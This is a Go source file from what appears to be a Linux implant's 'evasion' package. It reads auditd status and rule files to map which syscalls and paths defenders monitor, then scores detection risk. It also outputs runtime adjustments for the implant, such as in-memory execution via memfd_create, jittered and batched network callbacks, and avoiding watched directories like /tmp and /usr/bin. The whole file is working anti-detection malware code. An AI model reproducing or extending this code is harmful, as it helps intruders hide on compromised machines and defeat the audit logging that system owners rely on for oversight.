package evasion

import (
	"bufio"
	"os"
	"path/filepath"
	"strings"
)

// AuditRule represents a single parsed auditd rule from the audit configuration.
type AuditRule struct {
	Type    string            // "syscall", "watch", "exclude"
	Syscall string            // for syscall rules (-S)
	Path    string            // for watch rules (-w)
	Perms   string            // for watch rules (-p rwxa)
	Fields  map[string]string // -F field=value filters
	Key     string            // -k key tag
	Raw     string            // original rule text
}

// AuditInfo holds the results of auditd detection and rule analysis.
type AuditInfo struct {
	Active            bool
	Rules             []AuditRule
	MonitoredSyscalls map[string]bool // syscall name -> monitored
	WatchedPaths      []string        // file paths being watched (-w rules)
	RiskLevel         string          // NONE, LOW, MEDIUM, HIGH, CRITICAL
}

// namespaceSyscalls are syscalls directly related to namespace creation and manipulation.
// Monitoring these indicates the defender is specifically watching for container/namespace
// activity, which is critical for this implant.
var namespaceSyscalls = map[string]bool{
	"unshare":    true,
	"clone":      true,
	"clone3":     true,
	"setns":      true,
	"pivot_root": true,
}

// highRiskSyscalls are commonly monitored syscalls that affect implant operations.
var highRiskSyscalls = map[string]bool{
	"execve":        true,
	"execveat":      true,
	"connect":       true,
	"socket":        true,
	"bind":          true,
	"accept":        true,
	"accept4":       true,
	"ptrace":        true,
	"memfd_create":  true,
	"init_module":   true,
	"finit_module":  true,
	"delete_module": true,
}

// DetectAudit performs full audit subsystem detection: checks whether auditd is
// running, parses all discoverable audit rule files, builds the monitored syscall
// map and watched path list, and computes an overall risk level.
func DetectAudit() *AuditInfo {
	info := &AuditInfo{
		Rules:             make([]AuditRule, 0),
		MonitoredSyscalls: make(map[string]bool),
		WatchedPaths:      make([]string, 0),
		RiskLevel:         "NONE",
	}

	// Check if auditd is actively running by scanning /proc.
	info.Active = isAuditdRunning()

	// Parse rule files even if auditd is not currently running -- rules may
	// indicate intent (auditd could restart, or rules are loaded at boot).
	collectAuditRules(info)

	// Build the consolidated syscall and path maps from parsed rules.
	for _, rule := range info.Rules {
		switch rule.Type {
		case "syscall":
			if rule.Syscall != "" {
				info.MonitoredSyscalls[rule.Syscall] = true
			}
		case "watch":
			if rule.Path != "" {
				info.WatchedPaths = append(info.WatchedPaths, rule.Path)
			}
		}
	}

	// Compute risk level based on what is being monitored.
	info.RiskLevel = calculateAuditRisk(info)

	return info
}

// IsPathWatched checks if a given path or any of its parent directories is
// covered by an auditd file watch rule (-w). This determines whether file
// operations at the path would generate audit events.
func IsPathWatched(info *AuditInfo, path string) bool {
	if info == nil || len(info.WatchedPaths) == 0 {
		return false
	}

	cleanPath := filepath.Clean(path)

	for _, watched := range info.WatchedPaths {
		cleanWatched := filepath.Clean(watched)

		// Exact match.
		if cleanPath == cleanWatched {
			return true
		}

		// Check if the watched path is a parent directory of the target.
		// A watch on /etc catches /etc/passwd, /etc/shadow, etc.
		if strings.HasPrefix(cleanPath, cleanWatched+"/") {
			return true
		}
	}

	return false
}

// IsSyscallMonitored checks whether a specific syscall is being audited.
func IsSyscallMonitored(info *AuditInfo, syscall string) bool {
	if info == nil || len(info.MonitoredSyscalls) == 0 {
		return false
	}
	return info.MonitoredSyscalls[syscall]
}

// AuditBehaviorAdjustments returns a map of recommended behavioral changes
// based on the detected audit configuration. Keys are action identifiers and
// values are human-readable descriptions. The caller should use these to
// modify implant behavior at runtime.
func AuditBehaviorAdjustments(info *AuditInfo) map[string]string {
	adjustments := make(map[string]string)

	if info == nil || !info.Active {
		return adjustments
	}

	// Execution monitoring.
	if info.MonitoredSyscalls["execve"] || info.MonitoredSyscalls["execveat"] {
		adjustments["use_memfd_exec"] = "execve monitored: use memfd_create for in-memory execution"
	}

	// Network monitoring.
	if info.MonitoredSyscalls["connect"] || info.MonitoredSyscalls["socket"] {
		adjustments["minimize_connections"] = "connect/socket monitored: increase jitter, batch communications, minimize connection count"
	}
	if info.MonitoredSyscalls["bind"] || info.MonitoredSyscalls["accept"] || info.MonitoredSyscalls["accept4"] {
		adjustments["avoid_listeners"] = "bind/accept monitored: do not create listening sockets"
	}

	// File access monitoring.
	if info.MonitoredSyscalls["open"] || info.MonitoredSyscalls["openat"] {
		adjustments["tmpfs_only"] = "open/openat monitored: restrict file operations to tmpfs, avoid persistent disk writes"
	}

	// Ptrace monitoring.
	if info.MonitoredSyscalls["ptrace"] {
		adjustments["skip_antiptrace"] = "ptrace monitored: skip anti-ptrace measures to avoid triggering alerts"
	}

	// Namespace-related syscalls.
	if info.MonitoredSyscalls["clone"] || info.MonitoredSyscalls["clone3"] || info.MonitoredSyscalls["unshare"] {
		adjustments["namespace_critical"] = "clone/unshare monitored: namespace creation is audited, CRITICAL risk for this implant"
	}
	if info.MonitoredSyscalls["setns"] {
		adjustments["setns_critical"] = "setns monitored: namespace transitions are audited, avoid namespace switching"
	}

	// Memory execution monitoring.
	if info.MonitoredSyscalls["memfd_create"] {
		adjustments["direct_fd_ops"] = "memfd_create monitored: use direct fd operations or /dev/shm file descriptors instead"
	}

	// Module loading.
	if info.MonitoredSyscalls["init_module"] || info.MonitoredSyscalls["finit_module"] {
		adjustments["no_module_load"] = "module loading monitored: do not attempt kernel module operations"
	}

	// Path-based adjustments.
	if IsPathWatched(info, "/tmp") {
		adjustments["avoid_tmp"] = "/tmp watched: use alternative workspace path (/dev/mqueue, abstract sockets, or memfd)"
	}
	if IsPathWatched(info, "/dev/shm") {
		adjustments["avoid_devshm"] = "/dev/shm watched: use memfd_create or /run/user for temporary storage"
	}
	if IsPathWatched(info, "/etc") || IsPathWatched(info, "/etc/passwd") {
		adjustments["avoid_etc_reads"] = "/etc watched: minimize reads from /etc to avoid audit trail"
	}
	if IsPathWatched(info, "/var/log") {
		adjustments["avoid_log_tampering"] = "/var/log watched: do not attempt log modification"
	}
	if IsPathWatched(info, "/usr/bin") || IsPathWatched(info, "/usr/sbin") {
		adjustments["avoid_bin_dirs"] = "/usr/bin or /usr/sbin watched: do not drop binaries in system paths"
	}

	return adjustments
}

// isAuditdRunning scans /proc for a running auditd process by checking
// each process's comm file.
func isAuditdRunning() bool {
	procDir, err := os.Open("/proc")
	if err != nil {
		return false
	}
	defer procDir.Close()

	entries, err := procDir.Readdirnames(-1)
	if err != nil {
		return false
	}

	for _, entry := range entries {
		if len(entry) == 0 || entry[0] < '0' || entry[0] > '9' {
			continue
		}

		commPath := filepath.Join("/proc", entry, "comm")
		data, err := os.ReadFile(commPath)
		if err != nil {
			continue
		}

		comm := strings.TrimSpace(string(data))
		if comm == "auditd" {
			return true
		}
	}

	return false
}

// collectAuditRules reads and parses all discoverable audit rule files.
func collectAuditRules(info *AuditInfo) {
	// Primary rule file.
	readAndParseRuleFile(info, "/etc/audit/audit.rules")

	// Rules directory (used by augenrules to assemble the final ruleset).
	rulesDir := "/etc/audit/rules.d"
	dirEntries, err := os.ReadDir(rulesDir)
	if err == nil {
		for _, entry := range dirEntries {
			if strings.HasSuffix(entry.Name(), ".rules") {
				readAndParseRuleFile(info, filepath.Join(rulesDir, entry.Name()))
			}
		}
	}

	// Some distributions keep rules in alternative locations.
	altPaths := []string{
		"/etc/audit/rules.d.backup",
		"/etc/audisp/audispd.conf",
	}
	for _, p := range altPaths {
		if fi, err := os.Stat(p); err == nil && !fi.IsDir() {
			readAndParseRuleFile(info, p)
		}
	}
}

// readAndParseRuleFile reads a single audit rules file and appends parsed
// rules to the AuditInfo.
func readAndParseRuleFile(info *AuditInfo, path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}

	rules := parseAuditRules(string(data))
	info.Rules = append(info.Rules, rules...)
}

// parseAuditRules parses auditd rule file content into structured AuditRule
// entries. It handles the three main rule formats:
//   - Syscall rules: -a always,exit -F arch=b64 -S execve -k exec_log
//   - Watch rules:   -w /etc/passwd -p wa -k identity
//   - Exclude rules: -a never,exclude -F msgtype=CWD
//
// Multiple -S flags in a single rule produce separate AuditRule entries (one
// per syscall) to simplify lookup.
func parseAuditRules(content string) []AuditRule {
	var rules []AuditRule

	scanner := bufio.NewScanner(strings.NewReader(content))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())

		// Skip blank lines and comments.
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Skip control directives (-D, -b, -f, -e, --backlog_wait_time, etc.)
		if isControlDirective(line) {
			continue
		}

		// Watch rules: -w path [-p perms] [-k key]
		if strings.HasPrefix(line, "-w ") {
			rule := parseWatchRule(line)
			if rule != nil {
				rules = append(rules, *rule)
			}
			continue
		}

		// Syscall and exclude rules: -a action,list ...
		if strings.HasPrefix(line, "-a ") {
			parsed := parseSyscallRule(line)
			rules = append(rules, parsed...)
			continue
		}

		// Watch delete rules: -W (remove watch) -- note but don't process.
		// Rule removal rules: -A (prepend) -- treat same as -a.
		if strings.HasPrefix(line, "-A ") {
			parsed := parseSyscallRule(line)
			rules = append(rules, parsed...)
		}
	}

	return rules
}

// isControlDirective returns true if the line is an audit control directive
// rather than a monitoring rule.
func isControlDirective(line string) bool {
	controlPrefixes := []string{
		"-D",  // Delete all rules
		"-b ", // Backlog buffer size
		"-f ", // Failure mode
		"-e ", // Enable flag
		"--backlog_wait_time",
		"-r ", // Rate limit
		"--loginuid-immutable",
	}

	for _, prefix := range controlPrefixes {
		if strings.HasPrefix(line, prefix) {
			return true
		}
	}

	return false
}

// parseWatchRule parses a file watch rule: -w /path [-p perms] [-k key]
func parseWatchRule(line string) *AuditRule {
	rule := &AuditRule{
		Type:   "watch",
		Fields: make(map[string]string),
		Raw:    line,
	}

	tokens := tokenizeLine(line)
	for i := 0; i < len(tokens); i++ {
		switch tokens[i] {
		case "-w":
			if i+1 < len(tokens) {
				i++
				rule.Path = tokens[i]
			}
		case "-p":
			if i+1 < len(tokens) {
				i++
				rule.Perms = tokens[i]
			}
		case "-k":
			if i+1 < len(tokens) {
				i++
				rule.Key = tokens[i]
			}
		}
	}

	if rule.Path == "" {
		return nil
	}

	return rule
}

// parseSyscallRule parses a syscall or exclude rule. A single rule line may
// contain multiple -S flags, producing multiple AuditRule entries.
func parseSyscallRule(line string) []AuditRule {
	tokens := tokenizeLine(line)

	// Determine rule type from the action,list pair.
	ruleType := "syscall"
	var syscalls []string
	fields := make(map[string]string)
	key := ""

	for i := 0; i < len(tokens); i++ {
		switch tokens[i] {
		case "-a", "-A":
			if i+1 < len(tokens) {
				i++
				actionList := tokens[i]
				if strings.Contains(actionList, "never") || strings.Contains(actionList, "exclude") {
					ruleType = "exclude"
				}
			}
		case "-S":
			if i+1 < len(tokens) {
				i++
				// A single -S may contain comma-separated syscalls.
				parts := strings.Split(tokens[i], ",")
				for _, p := range parts {
					p = strings.TrimSpace(p)
					if p != "" {
						syscalls = append(syscalls, p)
					}
				}
			}
		case "-F":
			if i+1 < len(tokens) {
				i++
				eqIdx := strings.Index(tokens[i], "=")
				if eqIdx > 0 {
					fKey := tokens[i][:eqIdx]
					fVal := tokens[i][eqIdx+1:]
					fields[fKey] = fVal
				}
			}
		case "-k":
			if i+1 < len(tokens) {
				i++
				key = tokens[i]
			}
		}
	}

	// If no syscalls specified, this is a filter/exclude rule without syscall targets.
	if len(syscalls) == 0 {
		return []AuditRule{{
			Type:   ruleType,
			Fields: fields,
			Key:    key,
			Raw:    line,
		}}
	}

	// Produce one AuditRule per syscall for direct map lookup.
	// Deep-copy the Fields map for each rule so mutations to one don't
	// affect the others (they would all alias the same map otherwise).
	rules := make([]AuditRule, 0, len(syscalls))
	for _, sc := range syscalls {
		fieldsCopy := make(map[string]string, len(fields))
		for k, v := range fields {
			fieldsCopy[k] = v
		}
		rules = append(rules, AuditRule{
			Type:    ruleType,
			Syscall: sc,
			Fields:  fieldsCopy,
			Key:     key,
			Raw:     line,
		})
	}

	return rules
}

// tokenizeLine splits an audit rule line into tokens, respecting quoting.
func tokenizeLine(line string) []string {
	var tokens []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)

	for i := 0; i < len(line); i++ {
		ch := line[i]

		if inQuote {
			if ch == quoteChar {
				inQuote = false
			} else {
				current.WriteByte(ch)
			}
			continue
		}

		if ch == '"' || ch == '\'' {
			inQuote = true
			quoteChar = ch
			continue
		}

		if ch == ' ' || ch == '\t' {
			if current.Len() > 0 {
				tokens = append(tokens, current.String())
				current.Reset()
			}
			continue
		}

		current.WriteByte(ch)
	}

	if current.Len() > 0 {
		tokens = append(tokens, current.String())
	}

	return tokens
}

// calculateAuditRisk computes the risk level string based on the audit
// configuration analysis.
//
// Risk levels:
//
//	NONE     - auditd not running and no rule files found
//	LOW      - auditd running but few or generic rules
//	MEDIUM   - common operational syscalls monitored (execve, connect)
//	HIGH     - namespace-related syscalls monitored (unshare, clone, setns)
//	CRITICAL - comprehensive auditing or implant-specific paths watched
func calculateAuditRisk(info *AuditInfo) string {
	if !info.Active && len(info.Rules) == 0 {
		return "NONE"
	}

	// Check for CRITICAL conditions first.
	// Comprehensive syscall auditing: many high-value syscalls monitored.
	monitoredHighRisk := 0
	for sc := range info.MonitoredSyscalls {
		if highRiskSyscalls[sc] {
			monitoredHighRisk++
		}
	}
	if monitoredHighRisk >= 5 {
		return "CRITICAL"
	}

	// Namespace syscalls being monitored is critical for this implant.
	monitoredNS := 0
	for sc := range info.MonitoredSyscalls {
		if namespaceSyscalls[sc] {
			monitoredNS++
		}
	}
	if monitoredNS >= 2 {
		return "CRITICAL"
	}

	// Watching paths we commonly use.
	criticalPaths := []string{"/dev/shm", "/tmp", "/proc", "/run"}
	watchedCritical := 0
	for _, cp := range criticalPaths {
		if IsPathWatched(info, cp) {
			watchedCritical++
		}
	}
	if watchedCritical >= 2 {
		return "CRITICAL"
	}

	// HIGH: any namespace-related syscall monitored.
	if monitoredNS > 0 {
		return "HIGH"
	}

	// HIGH: memfd_create monitored (directly targets in-memory execution).
	if info.MonitoredSyscalls["memfd_create"] {
		return "HIGH"
	}

	// MEDIUM: common operational syscalls monitored.
	mediumSyscalls := []string{"execve", "execveat", "connect", "socket", "open", "openat", "ptrace"}
	for _, sc := range mediumSyscalls {
		if info.MonitoredSyscalls[sc] {
			return "MEDIUM"
		}
	}

	// MEDIUM: significant number of watch rules.
	if len(info.WatchedPaths) >= 5 {
		return "MEDIUM"
	}

	// LOW: auditd running or rules exist but nothing targeted.
	if info.Active || len(info.Rules) > 0 {
		return "LOW"
	}

	return "NONE"
}
